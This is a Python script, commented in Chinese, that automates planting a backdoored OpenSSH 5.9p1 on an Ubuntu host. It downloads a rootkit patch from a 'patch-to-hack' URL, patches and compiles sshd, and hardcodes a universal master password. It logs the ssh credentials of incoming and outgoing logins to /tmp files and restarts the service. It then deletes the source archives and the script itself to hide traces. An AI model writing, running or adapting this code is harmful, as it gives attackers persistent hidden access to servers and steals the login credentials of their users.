# coding=utf-8
# !/usr/bin/env python
import subprocess
import sys,os

def ml(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()  # 等待子进程完成

    stdout, stderr = process.communicate()  # 获取子进程的输出和错误
    try:
        decoded_stdout = stdout.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stdout = stdout.decode('latin1')
    try:
        decoded_stderr = stderr.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stderr = stderr.decode('latin1')
    return decoded_stdout


def Dowrj():
    command = "ls -la"
    j = ml(command)
    if "0x06-openssh-5.9p1.patch.tar.gz" in j and "openssh-5.9p1.tar.gz" in j:
        print("----------------------->软件包已经存在<-----------------------")
        return 1
    else:
        print("----------------------->正在下载软件包<-----------------------")
        return 0


def dfiel():
    command = "tar -xzvf openssh-5.9p1.tar.gz  && tar -xzvf 0x06-openssh-5.9p1.patch.tar.gz && cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1 &&cd openssh-5.9p1 && patch < sshbd5.9p1.diff"
    ml(command)


def miyue(old_contentm, new_content):
    filename = "openssh-5.9p1/includes.h"
    with open(filename, 'r') as file:
        lines = file.readlines()
    for a in range(0, 3):
        with open(filename, 'w') as file:
            for line in lines:
                if line.strip() != old_contentm.strip():
                    file.write(line)
            file.write(new_content + '\n')


def check_package_DowUbuntu():
    packages = ['openssl', 'libssl-dev', 'libpam0g-dev', 'libkrb5-dev', 'make', 'gcc', 'g++']
    print('------------------------->正在安装依赖<-------------------------')
    for package in packages:
        devnull = open(os.devnull, 'w')
        result = subprocess.Popen(['dpkg', '-s', package], stdout=subprocess.PIPE, stderr=devnull)
        result.wait()
        if result.returncode == 0:
            print("----------------------->{} 已安装<-----------------------".format(package))
        else:
            print("----------------------->{} 未安装<-----------------------".format(package))
            command = "apt-get install -y {}".format(package)
            ml(command)
            devnull = open(os.devnull, 'w')
            result = subprocess.Popen(['dpkg', '-s', package], stdout=subprocess.PIPE, stderr=devnull)
            result.wait()
            if result.returncode == 0:
                print("----------------------->{} 已安装<-----------------------".format(package))
            else:
                print("----------------------->{} 安装失败<-----------------------".format(package))

    return True


def DowUbuntu(password):
    check_package = check_package_DowUbuntu()
    if not check_package:
        print("正在安装软件包")

    command = "./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5 && make && make install"
    current_path = os.getcwd()
    working_directory = os.path.join(current_path, "openssh-5.9p1")
    process = subprocess.Popen(command, shell=True, cwd=working_directory)
    process.wait()

    ml("service ssh restart")
    ml("rm -rf 0x06-openssh-5.9p1.patch.tar.gz")
    ml("rm -rf  openssh-5.9p1.tar.gz")
    ml("rm -rf  penssh-5.9p1")
    ml("rm -rf  openssh-5.9p1.patch")
    print("------------------------>软件包已经清除<-------------------------")
    restart_result = ml("service ssh status")
    if restart_result is not None and "ssh start/spawned" in restart_result:
        print("密码为"+password)

def delete_current_script():
    try:
        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
        print("当前脚本文件已成功删除"+script_path)
    except Exception as e:
        print("无法删除当前脚本文件：", e)


if __name__ == '__main__':
    if Dowrj() == 0:
        command = "wget http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz && wget https://mirror.aarnet.edu.au/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz"
        subprocess.Popen(command, shell=True).wait()
        # .wait() 是 subprocess.Popen() 对象的方法之一，用于等待子进程完成执行并返回退出状态。

    dfiel()

    llinst = ['#define SECRETPW "apaajaboleh"', ' #define ILOG "/tmp/ilog"', '#define OLOG "/tmp/olog"',
              '#endif /* INCLUDES_H */']
    password = 'admin123!@qwe'
    password2 = '/tmp/ilog'
    password3 = '/tmp/olog'
    llinst_new_content = ['0', '0', '0', '#endif /* INCLUDES_H */']
    llinst_new_content[0] = '#define SECRETPW "' + password + '"'
    llinst_new_content[1] = '#define ILOG "' + password2 + '"'
    llinst_new_content[2] = '#define OLOG "' + password3 + '"'
    """
#define ILOG "/tmp/ilog"   #ILOG是别人用ssh登录该主机记录的日志目录[以及登录密码，当是不会记录隐藏账户]
#define OLOG "/tmp/olog"   #OLOG是该主机用ssh登录其他主机记录的日志目录 
#define SECRETPW "xiaodi"  #万能密码
    """
    for a in range(0, 4):
        miyue(llinst[a], llinst_new_content[a])
    DowUbuntu(password)
    delete_current_script()  # 删除当前执行脚本文件
